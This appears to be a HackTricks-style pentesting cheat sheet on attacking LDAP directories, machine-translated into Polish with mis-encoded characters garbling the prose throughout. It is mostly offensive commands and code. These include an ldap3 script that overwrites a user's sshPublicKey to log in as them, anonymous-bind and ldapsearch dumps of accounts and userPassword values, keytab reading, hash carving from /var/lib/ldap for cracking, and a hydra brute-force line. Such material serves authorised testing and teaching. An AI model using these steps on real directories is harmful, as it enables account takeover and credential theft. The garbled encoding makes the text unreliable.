# 389, 636, 3268, 3269 - Pentesting LDAP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

U偶ycie **LDAP** (Lightweight Directory Access Protocol) ma na celu g贸wnie lokalizowanie r贸偶nych podmiot贸w, takich jak organizacje, osoby i zasoby, takie jak pliki i urzdzenia w sieciach, zar贸wno publicznych, jak i prywatnych. Oferuje uproszczone podejcie w por贸wnaniu do swojego poprzednika, DAP, dziki mniejszemu rozmiarowi kodu.

Katalogi LDAP s zorganizowane w spos贸b umo偶liwiajcy ich dystrybucj na kilku serwerach, z kt贸rych ka偶dy przechowuje **replikowan** i **zsynchronizowan** wersj katalogu, nazywan Agentem Systemu Katalogowego (DSA). Odpowiedzialno za obsug 偶da spoczywa cakowicie na serwerze LDAP, kt贸ry mo偶e komunikowa si z innymi DSA w razie potrzeby, aby dostarczy jednolit odpowied藕 do wnioskodawcy.

Organizacja katalogu LDAP przypomina **hierarchi drzewiast, zaczynajc od katalogu g贸wnego na g贸rze**. Rozgazia si to na kraje, kt贸re dziel si dalej na organizacje, a nastpnie na jednostki organizacyjne reprezentujce r贸偶ne dziay lub departamenty, a偶 w kocu osiga poziom poszczeg贸lnych podmiot贸w, w tym ludzi i wsp贸lnych zasob贸w, takich jak pliki i drukarki.

**Domylny port:** 389 i 636(ldaps). Globalny Katalog (LDAP w ActiveDirectory) jest dostpny domylnie na portach 3268 i 3269 dla LDAPS.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAP Data Interchange Format

LDIF (LDAP Data Interchange Format) definiuje zawarto katalogu jako zestaw rekord贸w. Mo偶e r贸wnie偶 reprezentowa 偶dania aktualizacji (Dodaj, Zmie, Usu, Zmie nazw).
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* Linie 1-3 definiuj najwy偶szy poziom domeny local
* Linie 5-8 definiuj pierwszy poziom domeny moneycorp (moneycorp.local)
* Linie 10-16 definiuj 2 jednostki organizacyjne: dev i sales
* Linie 18-26 tworz obiekt domeny i przypisuj atrybuty z wartociami

## Write data

Zauwa偶, 偶e jeli mo偶esz modyfikowa wartoci, mo偶esz by w stanie wykona naprawd interesujce akcje. Na przykad, wyobra藕 sobie, 偶e **mo偶esz zmieni informacj "sshPublicKey"** swojego u偶ytkownika lub dowolnego u偶ytkownika. Jest bardzo prawdopodobne, 偶e jeli ten atrybut istnieje, to **ssh odczytuje klucze publiczne z LDAP**. Jeli mo偶esz zmodyfikowa klucz publiczny u偶ytkownika, **bdziesz m贸g zalogowa si jako ten u偶ytkownik, nawet jeli uwierzytelnianie hasem nie jest wczone w ssh**.
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## Sniff clear text credentials

Jeli LDAP jest u偶ywany bez SSL, mo偶esz **przechwyci dane logowania w postaci niezaszyfrowanej** w sieci.

Mo偶esz r贸wnie偶 przeprowadzi atak **MITM** w sieci **pomidzy serwerem LDAP a klientem.** Tutaj mo偶esz przeprowadzi **atak downgrade**, aby klient u偶ywa **danych logowania w postaci niezaszyfrowanej** do logowania.

**Jeli SSL jest u偶ywane**, mo偶esz spr贸bowa przeprowadzi **MITM** jak wspomniano powy偶ej, oferujc **faszywy certyfikat**; jeli **u偶ytkownik go zaakceptuje**, mo偶esz obni偶y metod uwierzytelniania i ponownie zobaczy dane logowania.

## Anonymous Access

### Bypass TLS SNI check

Zgodnie z [**tym artykuem**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) wystarczyo uzyska dostp do serwera LDAP za pomoc dowolnej nazwy domeny (takiej jak company.com), aby m贸c skontaktowa si z usug LDAP i wyodrbni informacje jako anonimowy u偶ytkownik:
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAP anonymous binds

[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) pozwalaj **nieautoryzowanym atakujcym** na uzyskanie informacji z domeny, takich jak pena lista u偶ytkownik贸w, grup, komputer贸w, atrybut贸w kont u偶ytkownik贸w oraz polityki hase domeny. Jest to **stara konfiguracja**, a od Windows Server 2003 tylko uwierzytelnieni u偶ytkownicy mog inicjowa 偶dania LDAP.\
Jednak偶e, administratorzy mogli potrzebowa **skonfigurowa okrelon aplikacj, aby umo偶liwi anonimowe poczenia** i przyzna wicej dostpu ni偶 zamierzano, co dao nieautoryzowanym u偶ytkownikom dostp do wszystkich obiekt贸w w AD.

## Valid Credentials

Jeli masz wa偶ne dane logowania do serwera LDAP, mo偶esz zrzuci wszystkie informacje o Administratorze Domeny, u偶ywajc:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Brute Force](../generic-hacking/brute-force.md#ldap)

## Enumeracja

### Zautomatyzowana

Korzystajc z tego, bdziesz w stanie zobaczy **publiczne informacje** (jak nazwa domeny)**:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Zobacz enumeracj LDAP z u偶yciem Pythona</summary>

Mo偶esz spr贸bowa **enumerowa LDAP z lub bez powiadcze u偶ywajc Pythona**: `pip3 install ldap3`

Najpierw spr贸buj **poczy si bez** powiadcze:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
Jeli odpowied藕 to `True`, jak w poprzednim przykadzie, mo偶esz uzyska pewne **interesujce dane** z serwera LDAP (takie jak **kontekst nazewniczy** lub **nazwa domeny**) z:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
Once you have the naming context you can make some more exciting queries. To zapytanie powinno pokaza wszystkie obiekty w katalogu:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
Lub **dump** caego ldap:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) to skrypt w Pythonie przydatny do **enumeracji u偶ytkownik贸w, grup i komputer贸w z domeny Windows** za pomoc zapyta LDAP.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

Sprawd藕 puste powiadczenia lub czy twoje powiadczenia s wa偶ne:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
Jeli znajdziesz co m贸wicego, 偶e "_bind musi by zakoczony_", oznacza to, 偶e dane uwierzytelniajce s nieprawidowe.

Mo偶esz wyodrbni **wszystko z domeny** u偶ywajc:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
Wyodrbnij **u偶ytkownik贸w**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
Wyodrbnij **komputery**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Wycignij **moje informacje**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Wyodrbnij **Domain Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Wyodrbnij **U偶ytkownik贸w Domeny**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Wyodrbnij **Enterprise Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Extract **Administratorzy**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Extract **Grupa Zdalnego Pulpitu**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Aby sprawdzi, czy masz dostp do jakiegokolwiek hasa, mo偶esz u偶y grep po wykonaniu jednego z zapyta:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
Prosz zauwa偶y, 偶e hasa, kt贸re mo偶esz tutaj znale藕, mog nie by prawdziwe...

#### pbis

Mo偶esz pobra **pbis** std: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) i zazwyczaj jest instalowany w `/opt/pbis`.\
**Pbis** pozwala na atwe uzyskanie podstawowych informacji:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## Interfejs graficzny

### Apache Directory

[**Pobierz Apache Directory std**](https://directory.apache.org/studio/download/download-linux.html). Mo偶esz znale藕 [przykad u偶ycia tego narzdzia tutaj](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

Mo偶esz pobra interfejs graficzny z serwerem LDAP tutaj: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

Domylnie jest zainstalowany w: _/opt/jxplorer_

![](<../.gitbook/assets/image (482).png>)

### Godap

Godap to interaktywne terminalowe interfejs u偶ytkownika dla LDAP, kt贸re mo偶na wykorzysta do interakcji z obiektami i atrybutami w AD i innych serwerach LDAP. Jest dostpne dla Windows, Linux i MacOS i obsuguje proste poczenia, pass-the-hash, pass-the-ticket i pass-the-cert, a tak偶e kilka innych specjalistycznych funkcji, takich jak wyszukiwanie/tworzenie/zmiiana/usuwanie obiekt贸w, dodawanie/usuwanie u偶ytkownik贸w z grup, zmiana hase, edytowanie uprawnie obiekt贸w (DACL), modyfikowanie zintegrowanego DNS Active Directory (ADIDNS), eksportowanie do plik贸w JSON itp.

![](<../.gitbook/assets/godap.png>)

Mo偶esz uzyska do niego dostp pod adresem [https://github.com/Macmod/godap](https://github.com/Macmod/godap). Aby zobaczy przykady u偶ycia i instrukcje, przeczytaj [Wiki](https://github.com/Macmod/godap/wiki).

### Ldapx

Ldapx to elastyczny proxy LDAP, kt贸re mo偶na wykorzysta do inspekcji i transformacji ruchu LDAP z innych narzdzi. Mo偶e by u偶ywane do obfuskacji ruchu LDAP w celu pr贸by ominicia narzdzi ochrony to偶samoci i monitorowania LDAP oraz implementuje wikszo metod przedstawionych w prezentacji [MaLDAPtive](https://www.youtube.com/watch?v=mKRS5Iyy7Qo).

![](<../.gitbook/assets/ldapx.png>)

Mo偶esz go pobra z [https://github.com/Macmod/ldapx](https://github.com/Macmod/ldapx).

## Uwierzytelnianie za pomoc kerberos

U偶ywajc `ldapsearch`, mo偶esz **uwierzytelni si** za pomoc **kerberos zamiast** przez **NTLM**, u偶ywajc parametru `-Y GSSAPI`.

## POST

Jeli masz dostp do plik贸w, w kt贸rych znajduj si bazy danych (mog by w _/var/lib/ldap_). Mo偶esz wyodrbni hashe u偶ywajc:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
Mo偶esz poda johnowi hash hasa (od '{SSHA}' do 'structural' bez dodawania 'structural').

### Pliki konfiguracyjne

* Og贸lne
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 server
* V3.sas.oc
* Microsoft Active Directory server
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP directory server
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## HackTricks Automatyczne Komendy
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
